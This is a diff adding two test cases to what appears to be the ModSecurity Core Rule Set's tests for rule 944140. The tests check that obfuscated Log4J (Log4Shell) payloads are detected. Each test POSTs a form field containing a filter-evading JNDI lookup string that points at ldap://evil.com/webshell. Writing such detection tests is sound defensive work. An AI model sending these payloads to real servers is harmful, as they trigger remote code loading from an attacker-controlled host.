@@ -99,3 +99,41 @@
               data: foo=${${env:FOO:-j}ndi:ldap://evil.com/webshell}
             output:
               log_contains: "id \"944140\""
+    -
+      test_title: 944140-6
+      desc: Log4J exploit on arg foo, with evasion
+      stages:
+        -
+          stage:
+            input:
+              dest_addr: "127.0.0.1"
+              headers:
+                Accept: "*/*"
+                Host: localhost
+                User-Agent: ModSecurity CRS 3 Tests
+                Content-Type: application/x-www-form-urlencoded
+              method: POST
+              port: 80
+              uri: /
+              data: foo=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/webshell}
+            output:
+              log_contains: "id \"944140\""
+    -
+      test_title: 944140-7
+      desc: Log4J exploit on arg foo, with evasion
+      stages:
+        -
+          stage:
+            input:
+              dest_addr: "127.0.0.1"
+              headers:
+                Accept: "*/*"
+                Host: localhost
+                User-Agent: ModSecurity CRS 3 Tests
+                Content-Type: application/x-www-form-urlencoded
+              method: POST
+              port: 80
+              uri: /
+              data: foo=$${env:something:-${env:something:-$}{jndi:ldap://evil.com/webshell}}}
+            output:
+              log_contains: "id \"944140\""
